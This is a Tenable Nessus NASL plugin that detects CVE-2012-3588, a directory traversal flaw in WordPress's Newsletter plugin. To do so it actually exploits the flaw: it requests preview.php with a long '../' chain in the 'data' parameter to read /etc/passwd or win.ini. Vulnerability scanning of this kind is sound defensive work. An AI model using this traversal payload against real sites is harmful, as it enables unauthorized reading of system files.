#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(65764);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_cve_id("CVE-2012-3588");
  script_bugtraq_id(53900);
  script_osvdb_id(82703);
  script_xref(name:"EDB-ID", value:"19018");

  script_name(english:"Newsletter Plugin for WordPress 'preview.php' 'data' Parameter Directory Traversal");
  script_summary(english:"Attempts to retrieve a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Newsletter Plugin for WordPress installed on the remote host is
affected by a directory traversal vulnerability. The issue is due to
the 'plugins/plugin-newsletter/preview.php' script failing to properly
sanitize input to that 'data' parameter. This allows a remote attacker
to view the contents of files located outside of the server's root
directory by sending a URI that contains directory traversal
characters.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/04/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Newsletter";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "plugin-newsletter/plugin-newsletter.js"][0] =
    make_list('function newsletterPreview\\(');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('/windows/win.ini', '/winnt/win.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
# look for section tags in win.ini
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

vuln_param = 'data';

traversal = mult_str(str:"../",nb:12) + '..';
# Try to exploit the issue to retrieve a file.
foreach file (files)
{
  file_pat = file_pats[file];

  exploit_url = dir + "/wp-content/plugins/plugin-newsletter/preview.php?" + vuln_param + "=" + traversal + file;

  res = http_send_recv3(port:port, method:"GET", item:exploit_url, exit_on_fail:TRUE);
  pat = file_pats[file];
  if (egrep(pattern:pat, string:res[2]))
  {
    line_limit = 10;
    if (report_verbosity > 0)
    {
      header =
        'Nessus was able to exploit the issue to retrieve the contents of\n' +
        "'" + file + "' on the remote host using the following URL :";
      trailer = '';

      if (report_verbosity > 1)
      {
        trailer =
          'Here are its contents (limited to ' + line_limit + ' lines) :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          beginning_of_response(resp:res[2], max_lines:line_limit) +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30);
      }

      report = get_vuln_report(items:exploit_url, port:port, header:header, trailer:trailer);
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
